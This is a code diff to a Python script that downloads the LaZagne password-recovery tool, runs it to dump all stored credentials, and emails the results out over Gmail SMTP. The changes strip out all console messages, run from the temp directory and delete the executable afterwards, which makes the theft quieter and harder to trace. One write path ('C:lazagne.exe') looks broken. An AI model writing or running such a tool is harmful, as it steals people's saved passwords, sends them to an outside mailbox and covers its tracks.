@@ -6,18 +6,17 @@ import smtplib
 from email.message import EmailMessage
 import random
 import string
+import os
+import tempfile
 
 
 def download_lazagne(url):
-    print('[+] Downloading lazagne...')
     try:
         response = requests.get(url)
-        with open('lazagne.exe', 'wb') as file:
+        with open('C:lazagne.exe', 'wb') as file:
             file.write(response.content)
     except Exception as e:
-        print('[!] Exception - {}'.format(e))
         return
-    print('[+] File downloaded.')
 
 
 def create_email(recipient, email_text):
@@ -38,23 +37,19 @@ def send_mail(email_text, recipient, password):
     """
     msg = create_email(recipient, email_text)
     server = smtplib.SMTP('smtp.gmail.com', 587)
-    print('[+] Sending results via email.')
     try:
         server.ehlo()
         server.starttls()
         server.login(user=recipient, password=password)
         server.send_message(msg)
     except Exception as e:
-        print('[-] Exception - {}'.format(e))
         server.quit()
         return
     finally:
         server.quit()
-    print('[+] Email sent.')
 
 
 def report(email, password):
-    print('[+] Running lazagne.exe...')
     cmd = 'lazagne.exe all -v'
     response = subprocess.check_output(cmd)
     send_mail(response.decode('utf-8'), email, password)
@@ -66,7 +61,9 @@ if __name__ == '__main__':
     parser.add_argument('-e', dest='email', help='Email to send results of LaZagne output.', required=True)
     parser.add_argument('-p', dest='password', help='Email password.', required=True)
     args = parser.parse_args()
+    os.chdir(tempfile.gettempdir())
     download_lazagne(args.url)
     report(args.email, args.password)
+    os.remove('lazagne.exe')
 
 
